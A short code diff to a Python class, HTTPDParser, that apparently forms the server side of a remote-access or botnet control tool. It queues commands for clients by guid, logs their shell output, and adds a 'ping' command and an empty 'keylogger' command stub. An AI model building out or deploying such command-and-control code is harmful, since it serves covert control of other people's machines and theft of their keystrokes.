@@ -10,20 +10,23 @@ class HTTPDParser:
     def __init__(self, config):
         self.cmds = {}
         self.cmds["register"] = self.register
-        self.cmds["hello"] = self.hello
+	self.cmds["ping"] = self.ping
+	self.cmds["keylogger"] = self.keylogger
         self.config = config
-        self.output = ";"
+	self.output = None
         self.db = self.config.get("redis")
-        
-    def parse_cmd(self, guid, data):
+
+    def parse_cmd(self, guid, data, cmd_guid = None):
         cmd = data.split(" ", 1)[0].lower()
         if self.cmds.has_key(cmd):
             callback = self.cmds[cmd]
             callback(guid, data)
         else:
-            # I assume we got command output here and save it
-            if not data.strip() == "":
-                self.db.push_output(guid, data)
+            if cmd_guid == None:
+		self.hello(guid, data)
+	    else:
+                # I assume we got command output here and save it
+                self.db.push_output(guid, data, cmd_guid)
                 Log.log_shell(guid, "Received", data)
             
         return self.output
@@ -39,3 +42,9 @@ class HTTPDParser:
         
     def hello(self, guid, data):
         self.output = self.db.get_cmd(guid)
+
+    def ping(self, guid, data):
+	self.output = "pong"
+
+    def keylogger(self, guid, data):
+	pass
